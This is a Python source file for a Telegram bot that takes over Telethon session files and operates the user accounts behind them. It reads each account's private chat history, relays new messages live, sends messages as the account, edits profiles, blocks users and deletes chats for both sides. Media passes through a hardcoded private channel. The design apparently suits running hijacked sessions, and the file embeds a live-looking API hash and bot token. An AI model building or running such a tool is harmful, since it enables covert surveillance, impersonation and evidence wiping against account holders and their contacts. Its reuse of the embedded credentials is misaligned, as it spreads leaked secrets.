import os
import asyncio
import telebot
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telethon.sync import TelegramClient
from telethon import events
from telethon.tl.types import User, Dialog
from telethon.errors import SessionPasswordNeededError, FloodWaitError, RPCError
from telethon import functions, types
from telethon.tl.functions.messages import DeleteHistoryRequest
from datetime import datetime, timezone

API_ID = 21802729
API_HASH = '8cd12c59fa1b087d1058c262c9430716'
BOT_TOKEN = '8039380193:AAGVLA9An_Aau_fWOZiDwlUVQuOPJ8nM2ss'

bot = telebot.TeleBot(BOT_TOKEN)
SESSION_DIR = '.'  # Current directory
user_sessions = {}  # Store selected session per user
last_sent_users = {}  # Store last sent user list per chat
updating_chats = {}
active_clients = {}

def generate_random_string():
    return str(random.randint(100000, 999999))

async def check_session(session_file):
    try:
        client = TelegramClient(session_file.replace('.session', ''), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None
        await client.send_message('@BotFather', '/start')
        await client.disconnect()
        return session_file
    except (SessionPasswordNeededError, FloodWaitError, RPCError):
        return None

def get_working_sessions():
    sessions = [f for f in os.listdir(SESSION_DIR) if f.endswith('.session')]
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = [check_session(session) for session in sessions]
    working_sessions = loop.run_until_complete(asyncio.gather(*tasks))
    return [s for s in working_sessions if s]

async def get_recent_users(session_file):
    client = TelegramClient(session_file.replace('.session', ''), API_ID, API_HASH)
    await client.connect()

    recent_users = []
    async for dialog in client.iter_dialogs():
        if isinstance(dialog.entity, User) and not dialog.entity.bot:
            user = dialog.entity
            unread_count = dialog.unread_count if hasattr(dialog, 'unread_count') else 0

            last_seen = getattr(user.status, 'was_online', None) or getattr(user.status, 'expires', None)
            if last_seen and isinstance(last_seen, datetime):
                last_seen = last_seen.replace(tzinfo=timezone.utc)
                status = '🟢' if (datetime.now(timezone.utc) - last_seen).total_seconds() < 60 else '🔴'
            else:
                status = '🔴'

            recent_users.append((user, status, unread_count))

        if len(recent_users) >= 10:
            break

    await client.disconnect()
    return recent_users

async def refresh_users_list(chat_id, session_name, message_id):
    recent_users = await get_recent_users(session_name)
    markup = InlineKeyboardMarkup()
    random_code = ''.join(random.choices('0123456789ABCDEF', k=16))

    for user, status, unread_count in recent_users:
        full_name = f"{user.first_name} {user.last_name}" if user.last_name else user.first_name
        display_text = f"{status} {full_name[:13] + '...' if full_name and len(full_name) > 10 else full_name or 'Unknown'} ( {unread_count} )"
        markup.add(InlineKeyboardButton(display_text, callback_data=f'user:{user.id}'))

    markup.add(
        InlineKeyboardButton('🔄', callback_data=f'refresh:{session_name}'),
        InlineKeyboardButton('↩️ Back', callback_data='back_to_sessions')
    )
    bot.edit_message_text(f'Select a user:\nCode: {random_code}', chat_id, message_id, reply_markup=markup)

@bot.message_handler(commands=['back'])
def back_command(message):
    chat_id = message.chat.id
    if chat_id in updating_chats:
        bot.send_message(chat_id, "Please click 'Stop Updating' first")
        return

    # Stop any active client connection
    if chat_id in active_clients:
        client = active_clients[chat_id]
        async def disconnect_client():
            await client.disconnect()
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(disconnect_client())
        loop.close()
        active_clients.pop(chat_id)

    updating_chats.pop(chat_id, None)
    user_sessions.pop(chat_id, None)
    #bot.send_message(chat_id, "Stopped monitoring messages. Send /start to start again")
    start_message(message)
    os._exit(0)  # Force exit the program

async def get_account_name(session_file):
    client = TelegramClient(session_file.replace('.session', ''), API_ID, API_HASH)
    await client.connect()
    me = await client.get_me()
    await client.disconnect()
    return f"{me.first_name} {me.last_name if me.last_name else ''}"

async def unblock_user(session_name, user_to_unblock):
    try:
        async with TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH) as client:
            try:
                # Try to get user by username if starts with @
                if isinstance(user_to_unblock, str) and user_to_unblock.startswith('@'):
                    user = await client.get_entity(user_to_unblock)
                    user_id = user.id
                else:
                    # Try as user ID
                    user_id = int(user_to_unblock)
                    user = await client.get_entity(user_id)

                await client(functions.contacts.UnblockRequest(id=user_id))
                return True, None
            except ValueError:
                return False, "Invalid username or user ID"
            except Exception as e:
                return False, f"Error: {str(e)}"
    except Exception as e:
        return False, f"Session error: {str(e)}"

async def clear_chat(session_name, user_to_clear):
    try:
        async with TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH) as client:
            try:
                # Try to get user by username if starts with @
                if isinstance(user_to_clear, str) and user_to_clear.startswith('@'):
                    user = await client.get_entity(user_to_clear)
                    user_id = user.id
                else:
                    # Try as user ID
                    user_id = int(user_to_clear)
                    user = await client.get_entity(user_id)

                await client(DeleteHistoryRequest(peer=user, max_id=0, revoke=True))
                return True, None
            except ValueError:
                return False, "Invalid username or user ID"
            except Exception as e:
                return False, f"Error: {str(e)}"
    except Exception as e:
        return False, f"Session error: {str(e)}"

async def block_user(session_name, user_to_block):
    try:
        async with TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH) as client:
            try:
                # Try to get user by username if starts with @
                if isinstance(user_to_block, str) and user_to_block.startswith('@'):
                    user = await client.get_entity(user_to_block)
                    user_id = user.id
                else:
                    # Try as user ID
                    user_id = int(user_to_block)
                    user = await client.get_entity(user_id)

                await client(functions.contacts.BlockRequest(id=user_id))
                return True, None
            except ValueError:
                return False, "Invalid username or user ID"
            except Exception as e:
                return False, f"Error: {str(e)}"
    except Exception as e:
        return False, f"Session error: {str(e)}"

@bot.message_handler(func=lambda message: message.text and message.text.startswith('.dm'))
def handle_dm_command(message):
    chat_id = message.chat.id
    if chat_id in active_clients:
        bot.reply_to(message, "Please finish your current chat session first using /back command")
        return

    try:
        user_to_dm = message.text.split('.dm ', 1)[1].strip()
        if not user_to_dm:
            raise ValueError()
    except:
        bot.reply_to(message, "Usage: .dm @username or .dm user_id")
        return

    working_sessions = get_working_sessions()
    if not working_sessions:
        bot.reply_to(message, "No working accounts found")
        return

    markup = InlineKeyboardMarkup()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    for session in working_sessions:
        account_name = loop.run_until_complete(get_account_name(session))
        markup.add(InlineKeyboardButton(
            account_name.strip(), 
            callback_data=f'dm:{session}:{user_to_dm}'
        ))

    loop.close()

    bot.reply_to(message, "Select account to DM with:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('dm:'))
def handle_dm_selection(call):
    chat_id = call.message.chat.id
    _, session_name, user_to_dm = call.data.split(':', 2)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def get_user_info():
        try:
            async with TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH) as client:
                try:
                    if user_to_dm.startswith('@'):
                        user = await client.get_entity(user_to_dm)
                    else:
                        user = await client.get_entity(int(user_to_dm))

                    full_name = f"{user.first_name} {user.last_name}" if user.last_name else user.first_name
                    markup = InlineKeyboardMarkup()
                    markup.add(InlineKeyboardButton("Start Chat", callback_data=f'user:{user.id}'))

                    bot.edit_message_text(
                        f"━━━━━━━━━━━━━━━\n🧑‍💻 𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: {full_name}\n🔗 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {('@' + user.username) if user.username else '❌ 𝗡𝗼𝗻𝗲'}\n🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: {user.id}\n━━━━━━━━━━━━━━━",
                        chat_id,
                        call.message.message_id,
                        reply_markup=markup
                    )
                    user_sessions[chat_id] = session_name
                except ValueError:
                    bot.edit_message_text("Invalid username or user ID", chat_id, call.message.message_id)
                except Exception as e:
                    bot.edit_message_text(f"Error: {str(e)}", chat_id, call.message.message_id)
        except Exception as e:
            bot.edit_message_text(f"Session error: {str(e)}", chat_id, call.message.message_id)

    loop.run_until_complete(get_user_info())
    loop.close()

@bot.message_handler(func=lambda message: message.text and message.text.startswith('.block'))
def handle_block_command(message):
    chat_id = message.chat.id
    if chat_id in active_clients:
        return

    try:
        user_to_block = message.text.split('.block ', 1)[1].strip()
        if not user_to_block:
            raise ValueError()
    except:
        bot.reply_to(message, "Usage: .block @username or .block user_id")
        return

    working_sessions = get_working_sessions()
    if not working_sessions:
        bot.reply_to(message, "No working accounts found")
        return

    markup = InlineKeyboardMarkup()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    for session in working_sessions:
        account_name = loop.run_until_complete(get_account_name(session))
        markup.add(InlineKeyboardButton(
            account_name.strip(), 
            callback_data=f'block:{session}:{user_to_block}'
        ))

    loop.close()

    bot.reply_to(message, "Select account to block with:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text and message.text.startswith('.unblock'))
def handle_unblock_command(message):
    chat_id = message.chat.id
    if chat_id in active_clients:
        return

    try:
        user_to_unblock = message.text.split('.unblock ', 1)[1].strip()
        if not user_to_unblock:
            raise ValueError()
    except:
        bot.reply_to(message, "Usage: .unblock @username or .unblock user_id")
        return

    working_sessions = get_working_sessions()
    if not working_sessions:
        bot.reply_to(message, "No working accounts found")
        return

    markup = InlineKeyboardMarkup()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    for session in working_sessions:
        account_name = loop.run_until_complete(get_account_name(session))
        markup.add(InlineKeyboardButton(
            account_name.strip(), 
            callback_data=f'unblock:{session}:{user_to_unblock}'
        ))

    loop.close()

    bot.reply_to(message, "Select account to unblock with:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('unblock:'))
def handle_unblock_selection(call):
    chat_id = call.message.chat.id
    _, session_name, user_to_unblock = call.data.split(':', 2)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    success, error = loop.run_until_complete(unblock_user(session_name, user_to_unblock))
    loop.close()

    if success:
        bot.edit_message_text(
            f"Successfully unblocked user {user_to_unblock}",
            chat_id,
            call.message.message_id
        )
    else:
        bot.edit_message_text(
            f"Failed to unblock user: {error}",
            chat_id,
            call.message.message_id
        )

@bot.message_handler(func=lambda message: message.text and message.text.startswith('.clearchat'))
def handle_clear_chat_command(message):
    chat_id = message.chat.id
    if chat_id in active_clients:
        return

    try:
        user_to_clear = message.text.split('.clearchat ', 1)[1].strip()
        if not user_to_clear:
            raise ValueError()
    except:
        bot.reply_to(message, "Usage: .clearchat @username or .clearchat user_id")
        return

    working_sessions = get_working_sessions()
    if not working_sessions:
        bot.reply_to(message, "No working accounts found")
        return

    markup = InlineKeyboardMarkup()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    for session in working_sessions:
        account_name = loop.run_until_complete(get_account_name(session))
        markup.add(InlineKeyboardButton(
            account_name.strip(), 
            callback_data=f'clear:{session}:{user_to_clear}'
        ))

    loop.close()

    bot.reply_to(message, "Select account to clear chat with:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('clear:'))
def handle_clear_selection(call):
    chat_id = call.message.chat.id
    _, session_name, user_to_clear = call.data.split(':', 2)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    success, error = loop.run_until_complete(clear_chat(session_name, user_to_clear))
    loop.close()

    if success:
        bot.edit_message_text(
            f"Successfully cleared chat with {user_to_clear}",
            chat_id,
            call.message.message_id
        )
    else:
        bot.edit_message_text(
            f"Failed to clear chat: {error}",
            chat_id,
            call.message.message_id
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith('block:'))
def handle_block_selection(call):
    chat_id = call.message.chat.id
    _, session_name, user_to_block = call.data.split(':', 2)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    success, error = loop.run_until_complete(block_user(session_name, user_to_block))
    loop.close()

    if success:
        bot.edit_message_text(
            f"Successfully blocked user {user_to_block}",
            chat_id,
            call.message.message_id
        )
    else:
        bot.edit_message_text(
            f"Failed to block user: {error}",
            chat_id,
            call.message.message_id
        )

async def get_account_info(session_name):
    try:
        async with TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH) as client:
            me = await client.get_me()
            full = await client(functions.users.GetFullUserRequest('me'))
            about = full.full_user.about
            photos = await client.get_profile_photos('me')
            photo = photos[0] if photos else None
            await client.download_media(photo, "profile_pic.jpg") if photo else None
            return me, about, bool(photo)
    except Exception as e:
        print(f"Error getting account info: {e}")
        return None, None, False

async def set_profile_photo(session_name, photo_path):
    try:
        async with TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH) as client:
            await client(functions.photos.UploadProfilePhotoRequest(
                file=await client.upload_file(photo_path)
            ))
            return True
    except Exception as e:
        print(f"Error setting profile photo: {e}")
        return False

async def delete_profile_photo(session_name):
    try:
        async with TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH) as client:
            photos = await client.get_profile_photos('me')
            for photo in photos:
                await client(functions.photos.DeletePhotosRequest(
                    id=[photo]
                ))
            return True
    except Exception as e:
        print(f"Error deleting profile photos: {e}")
        return False

async def set_bio(session_name, bio_text):
    try:
        async with TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH) as client:
            await client(functions.account.UpdateProfileRequest(
                about=bio_text
            ))
            return True
    except Exception as e:
        print(f"Error setting bio: {e}")
        return False

async def set_name(session_name, first_name, last_name=""):
    try:
        async with TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH) as client:
            await client(functions.account.UpdateProfileRequest(
                first_name=first_name,
                last_name=last_name
            ))
            return True
    except Exception as e:
        print(f"Error setting name: {e}")
        return False

async def set_username(session_name, username):
    try:
        async with TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH) as client:
            await client(functions.account.UpdateUsernameRequest(
                username=username
            ))
            return True
    except Exception as e:
        print(f"Error setting username: {e}")
        return False

@bot.callback_query_handler(func=lambda call: call.data.startswith("changename:"))
def handle_change_name(call):
    session_name = call.data.split(":")[1]
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("Back", callback_data=f"profile:{session_name}"))
    try:
        bot.edit_message_text("Send me the new name (format: FirstName LastName)", 
                            call.message.chat.id, 
                            call.message.message_id,
                            reply_markup=markup)
    except:
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id,
                        "Send me the new name (format: FirstName LastName)",
                        reply_markup=markup)

async def delete_bio(session_name):
    try:
        async with TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH) as client:
            await client(functions.account.UpdateProfileRequest(
                about=""
            ))
            return True
    except Exception as e:
        print(f"Error deleting bio: {e}")
        return False

def create_account_markup(session_name):
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("Change Name", callback_data=f"changename:{session_name}"))
    markup.row(InlineKeyboardButton("Change Username", callback_data=f"changeusername:{session_name}"))
    markup.row(
        InlineKeyboardButton("Change PFP", callback_data=f"changepfp:{session_name}"),
        InlineKeyboardButton("Change Bio", callback_data=f"changebio:{session_name}")
    )
    markup.row(InlineKeyboardButton("Back", callback_data="back"))
    return markup

def create_pfp_markup(session_name):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("Delete PFP", callback_data=f"delpfp:{session_name}"),
        InlineKeyboardButton("Back", callback_data="back")
    )
    return markup

def create_bio_markup(session_name):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("Delete Bio", callback_data=f"delbio:{session_name}"),
        InlineKeyboardButton("Back", callback_data="back")
    )
    return markup

@bot.message_handler(func=lambda message: message.text == "./")
def handle_dot_slash(message):
    if message.chat.id in active_clients:
        return

    working_sessions = get_working_sessions()
    if not working_sessions:
        bot.reply_to(message, "No working accounts found.")
        return

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    markup = InlineKeyboardMarkup()
    for session in working_sessions:
        account_name = loop.run_until_complete(get_account_name(session))
        markup.add(InlineKeyboardButton(account_name.strip(), callback_data=f"profile:{session}"))

    loop.close()
    bot.delete_message(message.chat.id, message.message_id)
    bot.send_message(message.chat.id, "Select an account:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("profile:"))
def handle_profile_selection(call):
    session_name = call.data.split(":")[1]
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    me, bio, has_photo = loop.run_until_complete(get_account_info(session_name))
    loop.close()

    name = f"{me.first_name} {me.last_name}" if me.last_name else me.first_name
    pfp_status = "" if has_photo else "\n🖼 𝗣𝗿𝗼𝗳𝗶𝗹𝗲: ❌ 𝗡𝗼𝗻𝗲"
    bio_text = f"\nℹ️ 𝗕𝗶𝗼: {bio if bio else '❌ 𝗡𝗼𝗻𝗲'}"
    text = f"━━━━━━━━━━━━━━━\n🧑‍💻 𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: {name}\n🔗 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {('@' + me.username) if me.username else '❌ 𝗡𝗼𝗻𝗲'}\n🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: {me.id}{bio_text}{pfp_status}\n━━━━━━━━━━━━━━━"
    markup = create_account_markup(session_name)

    if has_photo:
        with open("profile_pic.jpg", "rb") as photo:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_photo(call.message.chat.id, photo, caption=text, reply_markup=markup)
            os.remove("profile_pic.jpg")
    else:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("changepfp:"))
def handle_change_pfp(call):
    session_name = call.data.split(":")[1]
    markup = create_pfp_markup(session_name)
    try:
        bot.edit_message_text("Send me the pfp you want to apply on acc", 
                            call.message.chat.id, 
                            call.message.message_id, 
                            reply_markup=markup)
    except:
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id,
                        "Send me the pfp you want to apply on acc",
                        reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("delpfp:"))
def handle_delete_pfp(call):
    session_name = call.data.split(":")[1]
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(delete_profile_photo(session_name))
    loop.close()
    bot.delete_message(call.message.chat.id, call.message.message_id)
    os._exit(0)

@bot.callback_query_handler(func=lambda call: call.data.startswith("changebio:"))
def handle_change_bio(call):
    session_name = call.data.split(":")[1]
    markup = create_bio_markup(session_name)
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, 
                        "Send me the bio you want to apply on acc",
                        reply_markup=markup)
    except Exception as e:
        print(f"Error in handle_change_bio: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delbio:"))
def handle_delete_bio(call):
    session_name = call.data.split(":")[1]
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(delete_bio(session_name))
    loop.close()
    bot.delete_message(call.message.chat.id, call.message.message_id)
    os._exit(0)

@bot.callback_query_handler(func=lambda call: call.data == "back")
def handle_back(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    os._exit(0)

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if not message.reply_to_message:
        return

    original_text = message.reply_to_message.text
    if original_text != "Send me the pfp you want to apply on acc":
        return

    file_info = bot.get_file(message.photo[-1].file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    with open("profile_photo.jpg", 'wb') as new_file:
        new_file.write(downloaded_file)

    markup = message.reply_to_message.reply_markup
    session_name = None
    for row in markup.keyboard:
        for button in row:
            if button.callback_data.startswith("delpfp:"):
                session_name = button.callback_data.split(":")[1]
                break
        if session_name:
            break

    if session_name:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(set_profile_photo(session_name, "profile_photo.jpg"))
        me, bio, has_photo = loop.run_until_complete(get_account_info(session_name))
        loop.close()

        os.remove("profile_photo.jpg")
        bot.delete_message(message.chat.id, message.message_id)
        bot.edit_message_text(f"Bio: {bio if bio else 'No bio set'}", 
                            message.chat.id,
                            message.reply_to_message.message_id,
                            reply_markup=create_account_markup(session_name))

@bot.callback_query_handler(func=lambda call: call.data.startswith("changeusername:"))
def handle_change_username(call):
    session_name = call.data.split(":")[1]
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("Back", callback_data=f"profile:{session_name}"))
    try:
        bot.edit_message_text("Send me the new username (without @)", 
                            call.message.chat.id, 
                            call.message.message_id,
                            reply_markup=markup)
    except:
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id,
                        "Send me the new username (without @)",
                        reply_markup=markup)

@bot.message_handler(func=lambda message: message.text and not message.text.startswith("/"))
def handle_text(message):
    if not message.reply_to_message:
        return

    original_text = message.reply_to_message.text
    if original_text not in ["Send me the bio you want to apply on acc", 
                           "Send me the new name (format: FirstName LastName)",
                           "Send me the new username (without @)"]:
        return

    markup = message.reply_to_message.reply_markup
    session_name = None
    for row in markup.keyboard:
        for button in row:
            if button.callback_data.startswith("delbio:") or button.callback_data.startswith("profile:"):
                session_name = button.callback_data.split(":")[1]
                break
        if session_name:
            break

    if session_name:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        if message.reply_to_message.text == "Send me the new name (format: FirstName LastName)":
            names = message.text.split(maxsplit=1)
            first_name = names[0]
            last_name = names[1] if len(names) > 1 else ""
            success = loop.run_until_complete(set_name(session_name, first_name, last_name))
        elif message.reply_to_message.text == "Send me the new username (without @)":
            username = message.text.strip('@')  # Remove @ if user included it
            success = loop.run_until_complete(set_username(session_name, username))
        else:
            success = loop.run_until_complete(set_bio(session_name, message.text))

        if success:
            me, bio, has_photo = loop.run_until_complete(get_account_info(session_name))
            loop.close()

            name = f"{me.first_name} {me.last_name}" if me.last_name else me.first_name
            bio_text = bio if bio and bio.strip() else 'No bio set'
            bot.delete_message(message.chat.id, message.message_id)
            name = f"{me.first_name} {me.last_name}" if me.last_name else me.first_name
            bio_text = f"\nℹ️ 𝗕𝗶𝗼: {bio if bio else '❌ 𝗡𝗼𝗻𝗲'}"
            pfp_status = ""  # We don't need pfp status here since it's a bio/name update
            text = f"━━━━━━━━━━━━━━━\n🧑‍💻 𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: {name}\n🔗 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {('@' + me.username) if me.username else '❌ 𝗡𝗼𝗻𝗲'}\n🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: {me.id}{bio_text}\n━━━━━━━━━━━━━━━"
            bot.edit_message_text(text,
                                message.chat.id,
                                message.reply_to_message.message_id,
                                reply_markup=create_account_markup(session_name))
            os._exit(0)  # Restart the bot to apply changes
        else:
            bot.reply_to(message, "Failed to update profile")

@bot.message_handler(commands=['start'])
def start_message(message):
    chat_id = message.chat.id
    msg = bot.send_message(chat_id, '⏳', reply_to_message_id=message.message_id)

    working_sessions = get_working_sessions()

    if not working_sessions:
        bot.edit_message_text('No working accounts found.', chat_id, msg.message_id)
        return

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    markup = InlineKeyboardMarkup()
    for session in working_sessions:
        account_name = loop.run_until_complete(get_account_name(session))
        markup.add(InlineKeyboardButton(account_name.strip(), callback_data=f'session:{session}'))

    loop.close()
    bot.edit_message_text('Select an account:', chat_id, msg.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('refresh:'))
def handle_refresh(call):
    chat_id = call.message.chat.id
    session_name = call.data.split('refresh:')[1]
    #bot.edit_message_text('Refreshing users...', chat_id, call.message.message_id)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(refresh_users_list(chat_id, session_name, call.message.message_id))
    loop.close()

@bot.callback_query_handler(func=lambda call: call.data.startswith('session:'))
def handle_session_selection(call):
    chat_id = call.message.chat.id
    session_name = call.data.split('session:')[1]
    user_sessions[chat_id] = session_name
    last_sent_users[chat_id] = []
    bot.edit_message_text('Retrieving users...', chat_id, call.message.message_id)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(refresh_users_list(chat_id, session_name, call.message.message_id))

@bot.callback_query_handler(func=lambda call: call.data == 'back_to_sessions')
def back_to_sessions(call):
    chat_id = call.message.chat.id
    if chat_id in updating_chats:
        return
    updating_chats.pop(chat_id, None)
    user_sessions.pop(chat_id, None)

    bot.edit_message_text('⏳', chat_id, call.message.message_id)

    working_sessions = get_working_sessions()

    if not working_sessions:
        bot.edit_message_text('No working accounts found.', chat_id, call.message.message_id)
        return

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    markup = InlineKeyboardMarkup()
    for session in working_sessions:
        account_name = loop.run_until_complete(get_account_name(session))
        markup.add(InlineKeyboardButton(account_name.strip(), callback_data=f'session:{session}'))

    loop.close()

    bot.edit_message_text('Select an account:', chat_id, call.message.message_id, reply_markup=markup)


@bot.callback_query_handler(func=lambda call: call.data.startswith('user:'))
def handle_user_selection(call):
    chat_id = call.message.chat.id
    if chat_id in updating_chats:
        return

    user_id = int(call.data.split(':')[1])
    session_name = user_sessions.get(chat_id)

    if not session_name:
        return

    async def mark_messages_as_read(client, user_id):
        try:
            #await client.send_read_acknowledge(user_id)
            return True
        except Exception as e:
            print(f"Error marking messages as read: {e}")
            return False

    async def fetch_and_monitor():
        client = TelegramClient(session_name.replace('.session', ''), API_ID, API_HASH)
        active_clients[chat_id] = client
        await client.connect()

        user = await client.get_entity(user_id)
        full_name = f"{user.first_name} {user.last_name}" if user.last_name else user.first_name
        bot.edit_message_text(f"━━━━━━━━━━━━━━━\n🧑‍💻 𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: {full_name}\n🔗 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {('@' + user.username) if user.username else '❌ 𝗡𝗼𝗻𝗲'}\n🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: {user.id}\n━━━━━━━━━━━━━━━",
                            chat_id, call.message.message_id)

        # Fetch message history in chronological order
        messages = []
        async for message in client.iter_messages(user):
            messages.append(message)

        # Send messages in chronological order (oldest first)
        for message in reversed(messages):
            try:
                if message.media:
                    try:
                        forwarded = await client.forward_messages(-1002645529037, message)
                        if forwarded:
                            bot.forward_message(chat_id, -1002645529037, forwarded.id)
                    except Exception as e:
                        if "MessageIdInvalidError" in str(e):
                            prefix = "👤 : " if not message.out else "🤖 : "
                            bot.send_message(chat_id, f"{prefix}one time Image or something else")
                else:
                    prefix = "🤖 : " if message.out else "👤 : "
                    text = f"{prefix}{message.text}"
                    bot.send_message(chat_id, text)
            except Exception as e:
                print(f"Error handling message: {e}")
            await asyncio.sleep(0)  # Avoid flooding - default 0.01

        # Mark all messages as read
        if await mark_messages_as_read(client, user_id):
            #bot.send_message(chat_id, "✅ All messages marked as read")
            pass

        @client.on(events.NewMessage(from_users=[user_id]))
        async def handle_incoming(event):
            if event.media:
                forwarded = await client.forward_messages(-1002645529037, event.message)
                if forwarded:
                    bot.forward_message(chat_id, -1002645529037, forwarded.id)
            else:
                text = f"👤 : {event.text}"
                bot.send_message(chat_id, text)
                #if await mark_messages_as_read(client, user_id):
                    #bot.send_message(chat_id, "✅ All messages marked as read")
                    #pass

        # Create a queue for outgoing messages
        message_queue = asyncio.Queue()

        @bot.message_handler(func=lambda message: message.chat.id == chat_id, content_types=['text', 'photo', 'video', 'document', 'audio', 'voice', 'sticker'])
        def handle_outgoing(message):
            if message.text and message.text.startswith('/'):
                return

            if message.text:
                message_queue.put_nowait((message.text, message))
            else:
                # Forward media to channel first
                forwarded = bot.forward_message(-1002645529037, message.chat.id, message.message_id)
                if forwarded:
                    # Add media forwarding to the message queue
                    async def forward_media():
                        try:
                            msg = await client.get_messages(-1002645529037, ids=forwarded.message_id)
                            if msg:
                                await client.send_message(user_id, msg.message, file=msg.media)
                            return True
                        except Exception as e:
                            return str(e)

                    message_queue.put_nowait((forward_media(), message))

        async def process_outgoing_messages():
            while True:
                try:
                    content, message = await message_queue.get()
                    if isinstance(content, str):
                        await client.send_message(user_id, content)
                        bot.reply_to(message, f"🤖 : {content}")
                        bot.delete_message(message.chat.id, message.message_id)
                        if await mark_messages_as_read(client, user_id):
                            #bot.send_message(chat_id, "✅ All messages marked as read")
                            pass
                    else:
                        result = await content
                        if result is True:
                            bot.reply_to(message, "Media sent to user")
                            if await mark_messages_as_read(client, user_id):
                                #bot.send_message(chat_id, "✅ All messages marked as read")
                                pass
                        else:
                            bot.reply_to(message, f"Error sending media: {result}")
                except Exception as e:
                    print(f"Error processing message: {e}")
                await asyncio.sleep(0.1)

        # Run both monitoring tasks
        await asyncio.gather(
            client.run_until_disconnected(),
            process_outgoing_messages()
        )

    # Run the main monitoring function
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(fetch_and_monitor())
    finally:
        loop.close()

if __name__ == '__main__':
    bot.polling(none_stop=True)
